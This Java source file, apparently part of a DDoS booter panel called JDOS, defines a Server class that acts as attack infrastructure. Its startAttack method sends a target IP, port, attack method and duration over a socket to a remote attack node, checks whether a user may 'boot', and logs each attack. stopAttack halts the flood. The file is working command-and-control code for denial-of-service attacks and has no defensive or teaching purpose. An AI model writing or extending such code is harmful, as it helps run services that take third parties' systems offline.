package com.jdos.server;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

import com.jdos.util.FileManager;

/**
 * Represents a JDOSServer.
 * 
 * @author Desmond Jackson
 */
public class Server extends Object {

	/**
	 * The id of the server.
	 */
	private int serverId;

	/**
	 * The ip of the server.
	 */
	private String ip;

	/**
	 * The port of the server.
	 */
	private int port;
	
	/**
	 * The id of the user who started the attack.
	 */
	private int userId;

	/**
	 * The time in which the attack began.
	 */
	private long startTime;

	/**
	 * The length in seconds of the attack.
	 */
	private int attackTime;

	/**
	 * Creates the JDOSServer representation.
	 * 
	 * @param serverId The id of the server
	 * 
	 * @param ip The ip of the server
	 * 
	 * @param port The port of the server
	 */
	public Server(int serverId, String ip, int port) {
		super();
		this.serverId = serverId;
		this.ip = ip;
		this.port = port;
	}

	/**
	 * Starts an attack on the server.
	 * 
	 * @param userId The id of the user who started the attack
	 * 
	 * @param targetIp The target ip address
	 * 
	 * @param targetPort The target port
	 * 
	 * @param method The method to use
	 * 
	 * @param time The length in seconds of the attack
	 * 
	 * @return true if the attack started successfully
	 * 
	 * @throws IOException 
	 */
	public boolean startAttack(String userId, String targetIp, String targetPort, String method, String time)
			throws IOException {
		if (ServerManager.canBoot(userId) && !isAttacking()) {
			Socket socket = new Socket(ip, port);
			DataOutputStream dout = new DataOutputStream(socket.getOutputStream());
			dout.writeInt(0);
			dout.writeUTF(targetIp);
			dout.writeUTF(targetPort);
			dout.writeUTF(method);
			dout.writeUTF(time);
			dout.writeInt(0);
			dout.close();
			socket.close();
			attackTime = new Integer(time) * 1000;
			startTime = System.currentTimeMillis();
			this.userId = new Integer(userId);
			ServerManager.addAttackingServer(userId, this);
			FileManager.storeAttack(userId, targetIp, targetPort, method, time);
			return true;
		}
		return false;
	}

	/**
	 * Stops an attack on the server.
	 * 
	 * @param userId The id of the user who stopped the attack
	 * 
	 * @return true if the attack stopped successfully
	 * 
	 * @throws UnknownHostException
	 * 
	 * @throws IOException
	 */
	public boolean stopAttack(String userId) throws UnknownHostException, IOException {
		if (!ServerManager.canBoot(userId)) {
			Socket socket = new Socket(ip, port);
			DataOutputStream dout = new DataOutputStream(socket.getOutputStream());
			dout.writeInt(1);
			dout.writeInt(1);
			dout.close();
			socket.close();
			ServerManager.removeAttackingServer(userId);
			FileManager.storeStop(userId);
			return true;
		}
		return false;
	}

	/**
	 * Resets attack and start times.
	 */
	public void resetTimes() {
		attackTime = 0;
		startTime = 0;
		userId = 0;
	}

	/**
	 * Gets the remaining attack time on the server.
	 * 
	 * @return idle if the server is not attacking
	 */
	public String getRemainingAttackTime() {
		if (isAttacking())
			return (attackTime - (System.currentTimeMillis() - startTime)) / 1000 + "";
		return "idle";
	}

	/**
	 * Checks whether the server is attacking.
	 * 
	 * @return false if the server is not attacking
	 */
	public boolean isAttacking() {
		return attackTime > (System.currentTimeMillis() - startTime);
	}

	/**
	 * Checks whether the server is alive or not.
	 * 
	 * @return false if the server is not alive or unreachable
	 * 
	 * @throws UnknownHostException
	 * 
	 * @throws IOException
	 */
	public boolean isAlive() throws UnknownHostException, IOException {
		return InetAddress.getByName(ip).isReachable(2500);
	}
	
	/**
	 * Gets the id of the user who started the attack.
	 * 
	 * @return The id of the user who started the attack
	 */
	public int getUserId() {
		return userId;
	}

	/**
	 * Gets the server id.
	 * 
	 * @return The server id
	 */
	public int getId() {
		return serverId;
	}

}
